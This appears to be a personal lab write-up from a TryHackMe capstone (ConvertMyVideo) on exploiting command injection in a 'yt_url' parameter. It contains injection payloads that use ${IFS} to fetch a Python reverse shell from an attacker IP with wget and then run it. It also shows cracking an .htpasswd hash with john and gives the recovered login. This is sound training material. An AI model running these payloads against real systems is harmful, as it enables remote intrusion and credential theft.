Found Command Injection in `yt_url` payload [[PNPT/LPE/Capstones/ConvertMyVideo - THM/Enumeration|Enumeration]]
# Exploitation
---
- Using spaces does not work, so we can use `${IFS}` instead to get a simple python reverse shell
	- Upload a python reverse shell using:
	```
		yt_url=;`wget${IFS}http://10.11.135.80/rev.py`
	```
	- Run it:
```
		yt_url=;`python3${IFS}rev.py`
```
![[Pasted image 20250503141109.png]]
![[Pasted image 20250503141128.png]]
# Enumeration - Post Exploitation
---
- Fille `.htpasswd` in `admin` directory reveals password for `itsmeadmin`
	- ![[Pasted image 20250503141201.png]]
- Crack using `john`
	- ![[Pasted image 20250503141225.png]]
- `itsmeadmin` :  `jessie`